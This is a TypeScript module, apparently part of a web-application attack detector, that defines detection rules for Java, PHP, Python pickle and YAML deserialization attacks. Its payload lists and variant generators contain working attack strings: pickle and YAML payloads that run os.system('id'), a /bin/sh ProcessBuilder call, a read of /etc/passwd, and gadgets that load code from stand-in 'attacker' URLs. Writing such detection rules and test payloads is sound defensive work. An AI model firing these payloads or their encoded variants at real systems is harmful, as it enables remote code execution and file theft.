/**
 * Deserialization Invariant Classes — All 4
 */
import type { InvariantClassModule } from '../types.js'
import { deepDecode } from '../encoding.js'
import { l2DeserJava, l2DeserPHP, l2DeserPython } from '../../evaluators/l2-adapters.js'
import { gunzipSync } from 'node:zlib'

function hasJavaStreamHeader(buf: Uint8Array): boolean {
    for (let i = 0; i <= buf.length - 4; i++) {
        if (buf[i] === 0xac && buf[i + 1] === 0xed && buf[i + 2] === 0x00 && buf[i + 3] === 0x05) return true
    }
    return false
}

function hasJavaStreamHeaderInString(input: string): boolean {
    if (input.length < 4) return false
    const bytes = new Uint8Array(input.length)
    for (let i = 0; i < input.length; i++) bytes[i] = input.charCodeAt(i) & 0xff
    return hasJavaStreamHeader(bytes)
}

function hasGzipWrappedJavaStream(input: string): boolean {
    const gzipB64 = input.match(/\bH4sI[A-Za-z0-9+/=]{12,}\b/g) ?? []
    for (const b64 of gzipB64) {
        try {
            const compressed = Buffer.from(b64, 'base64')
            if (compressed.length < 10 || compressed[0] !== 0x1f || compressed[1] !== 0x8b) continue
            const plain = gunzipSync(compressed)
            if (hasJavaStreamHeader(plain)) return true
        } catch {
            // invalid gzip/base64 candidate; continue
        }
    }
    return false
}

export const deserJavaGadget: InvariantClassModule = {
    id: 'deser_java_gadget',
    description: 'Java deserialization gadget chain to achieve remote code execution',
    category: 'deser',
    severity: 'critical',
    calibration: { baseConfidence: 0.92 },

    mitre: ['T1203'],
    cwe: 'CWE-502',

    knownPayloads: [
        'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==',
        'aced00057372',
        '%72%4F%30%41%42%58',
        '%2572%254F%2530%2541%2542%2558',
        '\\xac\\xed\\x00\\x05\\x73\\x72',
        'AAEAAAD/////AQAAAAAAAAAMAgAAAFN5c3RlbS5TdHJpbmc=',
        '\\x04\\x08o:\\x08Gem::SpecFetcher',
        '!!java.lang.ProcessBuilder ["/bin/sh","-c","id"]',
        '{"@class":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","cmd":"id"}',
        '<java.beans.XMLDecoder><object class="java.lang.ProcessBuilder"><void method="start"/></object></java.beans.XMLDecoder>',
        'application/x-msgpack {"type":"ExtType","className":"java.lang.Runtime"}',
        'H4sIAAAAAAAAA1vzloG1uAgAlouKswYAAAA=',
        'java.lang.Runtime.getRuntime().exec("id")',
        'org.apache.commons.collections.functors.InvokerTransformer',
        'org.springframework.core.SerializableTypeWrapper',
        'process.mainModule.require("child_process").exec("id")',
        'require("fs").readFileSync("/etc/passwd","utf8")',
        `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}`,
        '<dynamic-proxy><interface>java.lang.Runtime</interface></dynamic-proxy>',
    ],

    knownBenign: [
        'java programming language',
        'runtime error occurred',
        'application serialized data',
    ],

    detect: (input: string): boolean => {
        const d = deepDecode(input)
        const compact = d.replace(/\s+/g, '')
        const javaMagic = /rO0AB(?:Q|X|[A-Za-z0-9+/=])|aced0005|ac[\s:_-]*ed[\s:_-]*00[\s:_-]*05|\\x?ac\\x?ed\\x?00\\x?05|\\xac\\xed\\x00\\x05/i
        const gadgetPatterns = /(?:java\.lang\.Runtime|ProcessBuilder|ChainedTransformer|InvokerTransformer|ConstantTransformer|commons-collections|ysoserial|org\.apache\.commons|org\.springframework\.core|process\.mainModule\.require\s*\(\s*['"]child_process['"]\s*\)|require\s*\(\s*['"]child_process['"]\s*\)|require\s*\(\s*['"]fs['"]\s*\)\s*\.\s*readFileSync|_\$\$ND_FUNC\$\$_function\s*\(\)\s*\{[\s\S]{0,120}require\s*\(\s*['"]child_process['"]\s*\)\s*\.\s*exec)/i
        // .NET BinaryFormatter: base64 starting with AAEAAAD
        const dotnetMagic = /^AAEAAAD[A-Za-z0-9+/=]+/
        // Ruby Marshal: \x04\x08 magic bytes (literal or escaped)
        const rubyMarshal = /(?:\\x04\\x08|\\u0004\\u0008|\x04\x08)(?:o:|[IiCcf'"lLqQdASPu\[@:])/
        // YAML deserialization gadgets
        const yamlGadget = /!!\s*(?:java\.lang\.|ruby\/object:|python\/object[:/]|python\/object\/apply:)/i
        // JSON gadget chains (@class, @type for Jackson/Fastjson/Gson)
        const jsonGadget = /"@(?:class|type)"\s*:\s*"(?:com\.|org\.|java\.|sun\.)/
        // XMLDecoder / XStream
        const xmlDeser = /<(?:java\.beans\.XMLDecoder|object\s+class=["']java\.|java\s+version=|dynamic-proxy>\s*<interface>\s*java\.lang\.Runtime\s*<\/interface>)/i
        // MessagePack typed extension abuse with embedded class hints
        const msgpackTyped = /application\/x-msgpack[\s\S]{0,120}(?:ExtType|className)|msgpack[\s\S]{0,80}(?:ExtType|className)/i
        return javaMagic.test(compact)
            || hasJavaStreamHeaderInString(d)
            || gadgetPatterns.test(d)
            || hasGzipWrappedJavaStream(compact)
            || dotnetMagic.test(compact)
            || rubyMarshal.test(d)
            || yamlGadget.test(d)
            || jsonGadget.test(d)
            || xmlDeser.test(d)
            || msgpackTyped.test(d)
    },
    detectL2: l2DeserJava,
    generateVariants: (count: number): string[] => {
        const seeds = ['rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==', 'aced00057372']
        const gzipWrapped = 'H4sIAAAAAAAAA1vzloG1uAgAlouKswYAAAA='
        const mutated = [
            encodeURIComponent(seeds[0]),
            encodeURIComponent(encodeURIComponent(seeds[0])),
            'rO0ABQ==',
            'rO0ABXQAAmlk',
            '%61%63%65%64%30%30%30%35%37%33%37%32',
            '%2561%2563%2565%2564%2530%2530%2530%2535%2537%2533%2537%2532',
            '\\x61\\x63\\x65\\x64\\x30\\x30\\x30\\x35\\x37\\x33\\x37\\x32',
            gzipWrapped,
            encodeURIComponent(gzipWrapped),
            encodeURIComponent(encodeURIComponent(gzipWrapped)),
        ]
        const v = [...seeds, ...mutated].filter(candidate => deserJavaGadget.detect(candidate))
        const r: string[] = []
        for (let i = 0; i < count; i++) r.push(v[i % v.length])
        return r
    },
}

export const deserPhpObject: InvariantClassModule = {
    id: 'deser_php_object',
    description: 'PHP object injection via unserialize() to trigger magic methods',
    category: 'deser',
    severity: 'high',
    calibration: { baseConfidence: 0.85 },

    mitre: ['T1203'],
    cwe: 'CWE-502',

    knownPayloads: [
        'O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}',
        'O:11:"Application":1:{s:3:"cmd";s:2:"id";}',
        'O:7:"Example":1:{s:3:"foo";s:3:"bar";}',
        'O:8:"stdClass":1:{s:3:"cmd";s:6:"id;pwd";}',
        'O:+6:"Malice":1:{s:3:"cmd";s:2:"id";}',
        'O : 6 : "Malice" : 0 : {}',
        'a:2:{i:0;s:4:"test";i:1;O:5:"MyObj":0:{}}',
        'O:10:"WakeChain":1:{s:3:"cmd";s:2:"id";}::__wakeup',
    ],

    knownBenign: [
        'Order #12345',
        'O: oxygen',
        'a: apple',
        'the format is O:N:',
    ],

    detect: (input: string): boolean => {
        const d = deepDecode(input)
        const phpObject = /\b(?:O|C)\s*:\s*[+-]?\d+\s*:\s*"[\w\\]+"\s*:/.test(d)
        const phpArrayContainer = /\ba\s*:\s*[+-]?\d+\s*:\s*\{/.test(d)
        const phpWakeupChain = /(?:__wakeup|__destruct|__toString)\b/i.test(d) && /\b(?:O|C)\s*:\s*[+-]?\d+\s*:/.test(d)
        return phpObject ||
            phpArrayContainer ||
            phpWakeupChain ||
            /\ba\s*:\s*[+-]?\d+\s*:\s*\{/.test(d) ||
            /"(?:__proto__)"\s*:\s*\{|"constructor"\s*:\s*\{\s*"prototype"\s*:/.test(d)
    },
    detectL2: l2DeserPHP,
    generateVariants: (count: number): string[] => {
        const seeds = [
            'O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}',
            'O:11:"Application":1:{s:3:"cmd";s:2:"id";}',
        ]
        const mutated = seeds.flatMap(payload => [
            payload.replace(/:/g, ' : '),
            payload.replace(/:/g, '\t:\t'),
            encodeURIComponent(payload),
            encodeURIComponent(encodeURIComponent(payload)),
            payload.replace(/^O:/, 'O:+'),
            payload.replace(/^O:/, 'O:-'),
        ])
        const v = [...seeds, ...mutated].filter(candidate => deserPhpObject.detect(candidate))
        const r: string[] = []
        for (let i = 0; i < count; i++) r.push(v[i % v.length])
        return r
    },
}

export const deserPythonPickle: InvariantClassModule = {
    id: 'deser_python_pickle',
    description: 'Python pickle deserialization to execute arbitrary code via __reduce__',
    category: 'deser',
    severity: 'critical',
    calibration: { baseConfidence: 0.92 },

    mitre: ['T1203'],
    cwe: 'CWE-502',

    knownPayloads: [
        "cos\nsystem\n(S'id'\ntR.",
        'cos\nsystem\n(S"id"\ntR.',
        "cbuiltins\neval\n(S'__import__(\"os\").system(\"id\")'\ntR.",
        '\\x80\\x02cposix\\nsystem\\nq\\x00X\\x02\\x00\\x00\\x00idq\\x01\\x85q\\x02Rq\\x03.',
        "csubprocess\nPopen\n(S'id'\ntR.",
        "cbuiltins\nexec\n(S'__import__(\"os\").system(\"id\")'\ntR.",
        '!!python/object/apply:os.system ["id"]',
        '\\x80\\x04\\x95\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00cos\\nsystem\\n',
        "<class 'Exploit'> __reduce__",
    ],

    knownBenign: [
        'pickle jar',
        'python programming',
        'import os',
        'reduce function',
    ],

    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return /(?:\x80[\x02-\x05]|\\x80\\x0[2-5]|\\x80\\x04\\x95)/.test(d) ||
            /cos\nsystem\n/i.test(d) ||
            /(?:^|\n)c(?:os|posix|subprocess|builtins|__builtin__)\n(?:system|popen|eval|exec|__import__)\n/i.test(d) ||
            /(?:^|\n)c[a-zA-Z0-9_.]+\n[a-zA-Z0-9_.]+\n[\s\S]{0,180}\(?(?:S|I|J|K|M|N|V|X)[\s\S]{0,180}tR\./i.test(d) ||
            /!!python\/object\/apply\s*:/i.test(d) ||
            /__reduce__/i.test(d)
    },
    detectL2: l2DeserPython,
    generateVariants: (count: number): string[] => {
        const seeds = ["cos\nsystem\n(S'id'\ntR.", "cbuiltins\neval\n(S'__import__(\"os\").system(\"id\")'\ntR."]
        const magic = '\\x80\\x02cposix\\nsystem\\nq\\x00X\\x02\\x00\\x00\\x00idq\\x01\\x85q\\x02Rq\\x03.'
        const mutated = [
            magic,
            magic.replace('\\x02', '\\x03'),
            magic.replace('\\x02', '\\x04'),
            magic.replace('\\x02', '\\x05'),
            encodeURIComponent(magic),
            encodeURIComponent(encodeURIComponent(magic)),
            "cposix\nsystem\n(S'id'\ntR.",
            "csubprocess\nPopen\n(S'id'\ntR.",
            '!!python/object/apply:os.system ["id"]',
        ]
        const v = [...seeds, ...mutated].filter(candidate => deserPythonPickle.detect(candidate))
        const r: string[] = []
        for (let i = 0; i < count; i++) r.push(v[i % v.length])
        return r
    },
}

export const yamlDeserialization: InvariantClassModule = {
    id: 'yaml_deserialization',
    description: 'YAML deserialization gadget chain leading to arbitrary code execution',
    category: 'deser',
    severity: 'critical',
    calibration: { baseConfidence: 0.94 },
    mitre: ['T1203'],
    cwe: 'CWE-502',
    knownPayloads: [
        '!!python/object/apply:os.system ["id"]',
        '!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker"]]]]',
        '!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: "rmi://attacker/Exploit", autoCommit: true}',
        '!!java.lang.ProcessBuilder ["/bin/sh","-c","id"]',
    ],
    knownBenign: [
        'name: api-service',
        'version: "1.0"',
        'database:\n  host: localhost',
    ],
    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return /!!python\/object\/apply\s*:\s*os\.system/i.test(d) ||
            /!!javax\.script\.ScriptEngineManager\b/i.test(d) ||
            /!!com\.sun\.rowset\.JdbcRowSetImpl\b/i.test(d) ||
            /!!java\.lang\.(?:ProcessBuilder|Runtime)\b/i.test(d)
    },
    generateVariants: (count: number): string[] => {
        const seeds = [
            '!!python/object/apply:os.system ["id"]',
            '!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker"]]]]',
            '!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: "rmi://attacker/Exploit", autoCommit: true}',
            '!!java.lang.ProcessBuilder ["/bin/sh","-c","id"]',
        ]
        const mutated = seeds.flatMap(payload => [
            payload,
            encodeURIComponent(payload),
            encodeURIComponent(encodeURIComponent(payload)),
        ])
        const variants = mutated.filter(candidate => yamlDeserialization.detect(candidate))
        const out: string[] = []
        for (let i = 0; i < count; i++) out.push(variants[i % variants.length])
        return out
    },
}

export const DESER_CLASSES: InvariantClassModule[] = [deserJavaGadget, deserPhpObject, deserPythonPickle, yamlDeserialization]
